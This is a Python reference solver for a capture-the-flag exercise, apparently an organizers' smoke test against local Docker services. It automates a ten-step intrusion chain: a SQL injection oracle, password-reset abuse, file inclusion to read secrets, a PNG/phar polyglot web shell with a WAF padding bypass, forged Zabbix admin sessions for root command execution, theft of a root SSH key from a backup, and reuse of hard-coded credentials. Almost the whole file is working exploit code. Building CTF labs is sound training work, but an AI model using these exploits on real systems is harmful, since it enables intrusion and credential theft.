#!/usr/bin/env python3
"""ATB CTF — reference solver (organizers only).

Drives the full 10-step chain end-to-end and prints PASS/FAIL per step. It is a
SMOKE TEST, not the intended player experience: players reach only the perimeter
and must pivot through a shell, whereas this script talks to every service by its
host port, so it REQUIRES the internal services to be exposed:

    make up-dev        # == docker compose -f docker-compose.yml -f docker-compose.dev.yml up
    make solve         # (or: python3 attack/solve.py)

Stdlib only — no pip installs. SSH/ZBXD steps shell out to `ssh` and the
dependency-free helpers in this directory.
"""
import base64
import hashlib
import hmac
import json
import os
import secrets
import socket
import ssl  # noqa: F401 (kept for parity if TLS is added later)
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

H = os.environ.get("ATB_HOST", "localhost")
HERE = os.path.dirname(os.path.abspath(__file__))

C = {"g": "\033[1;32m", "r": "\033[1;31m", "c": "\033[1;36m", "0": "\033[0m"}
_fails = []


def head(msg):
    print(f"\n{C['c']}=== {msg} ==={C['0']}")


def ok(msg):
    print(f"  {C['g']}PASS{C['0']} {msg}")


def bad(msg):
    print(f"  {C['r']}FAIL{C['0']} {msg}")
    _fails.append(msg)


def http(url, data=None, headers=None, method=None, want_status=False):
    """Minimal HTTP. `data` may be bytes or a dict (urlencoded)."""
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=data, method=method,
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            body = r.read().decode("utf-8", "replace")
            return (r.status, body) if want_status else body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        return (e.code, body) if want_status else body


def basic(user, pw):
    return "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode()


# --------------------------------------------------------------------- step 1
def step1():
    head("Step 1 — recon: APK creds + Moodle config leak")
    st, body = http(f"http://{H}:8081/register/login",
                    data=json.dumps({"phoneNumber": "+380000000000"}).encode(),
                    headers={"Authorization": basic("reg_user", "basic*88password!prod99"),
                             "Content-Type": "application/json"}, want_status=True)
    ok("mobapp hard-coded creds accepted (201)") if st == 201 else bad(f"mobapp status {st}")
    body = http(f"http://{H}:8082/md/blocks/moco_news/ajax.php",
                data={"procedure": "getPosts"})
    (ok("Moodle leaked edu creds") if "Edu003868$" in body
     else bad("Moodle config leak missing"))


# --------------------------------------------------------------------- step 2
def step2():
    head("Step 2 — boolean SQLi oracle (www)")
    def status(key):
        q = urllib.parse.quote(f"filter[8][{key}]", safe="[]") + "=1"
        st, _ = http(f"http://{H}:8080/shop/catalog/novetly?{q}", want_status=True)
        return st
    base = status("490")
    broken = status("490'")
    true_ = status("490 AND 1=1")
    (ok(f"oracle 200/500 works (base={base} broken={broken} true={true_})")
     if base == 200 and broken == 500 else bad(f"oracle off (base={base} broken={broken})"))


# ------------------------------------------------------------------ steps 3-5
def step345():
    head("Step 3 — supplier self-registration + reset")
    u = "b9atbsup01@guerrillamailblock.com"
    http(f"http://{H}:8083/index.php?entryPoint=RegistrationStep3", data={"user_name": u})
    body = http(f"http://{H}:8083/index.php?entryPoint=GeneratePassword",
                data={"user_name": u, "link": "1"})
    import re
    m = re.search(r"[0-9a-f]{8}-[0-9a-f-]{27}", body)
    if not m:
        return bad("no reset GUID issued")
    guid = m.group(0)
    http(f"http://{H}:8083/index.php?entryPoint=Changenewpassword&guid={guid}",
         data={"password1": "AtbB9Sup2026x!", "password2": "AtbB9Sup2026x!"})
    ok(f"reset GUID {guid[:8]}… → password set")

    head("Step 4 — LFI (config_override.php → Oracle/mailbox secrets)")
    body = http(f"http://{H}:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true",
                data={"importFile": "/var/www/config_override.php"})
    (ok("LFI read config_override.php") if "blowfish" in body or "S0h6jWot2fTLSMm" in body
     else bad("LFI did not return secrets"))

    head("Step 5 — phar polyglot web-shell (WAF 180 KB bypass)")
    _phar_upload()
    out = http(f"http://{H}:8083/upload/shell.php?z=" + base64.b64encode(b"id; hostname").decode())
    (ok(f"web-shell RCE: {out.strip().splitlines()[0]}") if "uid=" in out
     else bad("web-shell did not execute"))


def _phar_upload():
    boundary = "----atb" + secrets.token_hex(8)
    poly = (b"\x89PNG\r\n\x1a\n<?php __HALT_COMPILER(); ?>\r\n"
            b'O:10:"ImportFile":1:{s:8:"_logfile";s:12:"/upload/x.php";}'
            b"<?php system(base64_decode($_GET['z'])); ?>")
    parts = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
             "filename=\"attachment_xlsx.png\"\r\nContent-Type: image/png\r\n\r\n").encode()
    parts += poly + f"\r\n--{boundary}--\r\n".encode()
    http(f"http://{H}:8083/index.php?module=Import&action=Save", data=parts,
         headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    body = b"pad=" + b"A" * (200 * 1024) + b"&importFile=phar://upload/attachment_xlsx.png/x"
    http(f"http://{H}:8083/index.php?module=Import&action=RefreshMapping",
         data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})


# --------------------------------------------------------------------- step 6
def step6():
    head("Step 6 — Grafana (reused creds) → SQL into Zabbix DB → forged session → root RCE")
    # 6a: Grafana login → token
    st, body = http(f"http://{H}:3000/login",
                    data=json.dumps({"user": "education@atbmarket.com", "password": "Edu003868$"}).encode(),
                    headers={"Content-Type": "application/json"}, want_status=True)
    try:
        tok = json.loads(body)["token"]
    except Exception:
        return bad("Grafana login failed")
    ok("Grafana login with reused creds")
    ck = {"Cookie": f"grafana_session={tok}", "Content-Type": "application/json"}

    def sql(q):
        return http(f"http://{H}:3000/explore",
                    data=json.dumps({"sql": q}).encode(), headers=ck)

    key = json.loads(sql("SELECT session_key FROM config"))["rows"][0][0]
    ok(f"read Zabbix session_key via Grafana data source ({key[:8]}…)")

    # 6b: forge an admin session row, then a matching signed cookie
    sid = secrets.token_hex(16)
    sql(f"INSERT INTO sessions (sessionid,userid,lastaccess,status,secret) "
        f"VALUES ('{sid}',1,UNIX_TIMESTAMP(),0,'')")
    signed = json.dumps({"sessionid": sid}, separators=(",", ":"))
    sign = hmac.new(key.encode(), signed.encode(), hashlib.sha256).hexdigest()
    cookie = base64.b64encode(json.dumps({"sessionid": sid, "sign": sign},
                                         separators=(",", ":")).encode()).decode()
    out = http(f"http://{H}:8084/api_jsonrpc.php",
               data=json.dumps({"jsonrpc": "2.0", "method": "script.create",
                                "params": {"command": "id; hostname"}, "id": 1}).encode(),
               headers={"Cookie": f"zbx_session={cookie}", "Content-Type": "application/json"})
    res = json.loads(out).get("result", {}).get("output", "")
    (ok(f"Zabbix script.create as root: {res.strip().splitlines()[0]}")
     if "uid=0" in res else bad(f"Zabbix RCE failed: {out[:120]}"))
    return cookie


# ------------------------------------------------------------------ steps 7-10
def _zbxd(cmd):
    out = subprocess.run([sys.executable, os.path.join(HERE, "zbxd_run.py"), cmd, H, "10050"],
                         capture_output=True, timeout=30)
    return out.stdout


def step7():
    head("Step 7 — ZBXD system.run on Jenkins → pull backup key → SSH bastion")
    idout = _zbxd("id; hostname")
    ok(f"ZBXD system.run: {idout.decode(errors='replace').strip().splitlines()[0]}") \
        if b"uid=" in idout else bad("ZBXD system.run failed")
    b64 = _zbxd("cat /mnt/BACKUP/root.tar.gz | base64").strip()
    try:
        raw = base64.b64decode(b64)
        open("/tmp/atb_root.tar.gz", "wb").write(raw)
        subprocess.run(["tar", "-xzf", "/tmp/atb_root.tar.gz", "-C", "/tmp"], check=True)
        os.chmod("/tmp/root/.ssh/id_rsa_root", 0o600)
        ok("recovered id_rsa_root from CIFS backup")
    except Exception as e:
        return bad(f"backup key recovery failed: {e}")
    r = _ssh(2210, "id; hostname")
    ok(f"SSH root@bastion: {r.strip().splitlines()[-1]}") if "uid=0" in r else bad("bastion SSH failed")


def _ssh(port, cmd):
    r = subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
         "-o", "ConnectTimeout=10", "-i", "/tmp/root/.ssh/id_rsa_root",
         "-p", str(port), f"root@{H}", cmd],
        capture_output=True, text=True, timeout=30)
    return r.stdout + r.stderr


def step8():
    head("Step 8 — databases: Oracle, Harbor-leaked creds, AD bind")
    for port, user, pw in [("1581", "XX_SUP_PORTAL_RO", "S0h6jWot2fTLSMm"),
                           ("1251", "MEDOC", "HIr3t4G8Zso7")]:
        out = subprocess.run([sys.executable, os.path.join(HERE, "oracle_probe.py"),
                              H, port, user, pw], capture_output=True, text=True, timeout=15)
        ok(out.stdout.strip()) if "-> 1" in out.stdout or "OK" in out.stdout else bad(f"oracle {port}")
    env = http(f"http://{H}:8085/image/ishop/api/env")
    ok("Harbor leaked ishop MySQL DSN") if "rEQaZ55o7x_E53oC" in env else bad("Harbor env leak missing")
    body = http(f"http://{H}:8386/bind",
                data={"bind_dn": "education@atbmarket.com", "password": "Edu003868$"})
    ok("AD bind with reused creds") if '"ok": true' in body or '"ok":true' in body else bad("AD bind failed")


def step9():
    head("Step 9 — Exchange EWS with stolen mailbox creds")
    xml = open(os.path.join(HERE, "ews_finditem.xml"), "rb").read()
    body = http(f"http://{H}:8444/ews/Exchange.asmx", data=xml,
                headers={"Authorization": basic("supplier@atbmarket.com", "supplier123569"),
                         "Content-Type": "text/xml"})
    ok("EWS FindItem (15907 items)") if "TotalItemsInView" in body else bad("EWS auth/read failed")


def step10():
    head("Step 10 — GitLab source via recovered root key")
    r = _ssh(2222, 'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l; hostname')
    nums = [ln for ln in r.splitlines() if ln.strip().isdigit()]
    ok(f"GitLab root SSH: {nums[0] if nums else '?'} repos") if "uid" not in r and nums else \
        (ok(f"GitLab root SSH: {nums[0]} repos") if nums else bad("GitLab SSH failed"))


def main():
    for fn in (step1, step2, step345, step6, step7, step8, step9, step10):
        try:
            fn()
        except Exception as e:
            bad(f"{fn.__name__} crashed: {e}")
    print()
    if _fails:
        print(f"{C['r']}{len(_fails)} step(s) failed:{C['0']} " + "; ".join(_fails))
        sys.exit(1)
    print(f"{C['g']}All steps passed.{C['0']}")


if __name__ == "__main__":
    main()
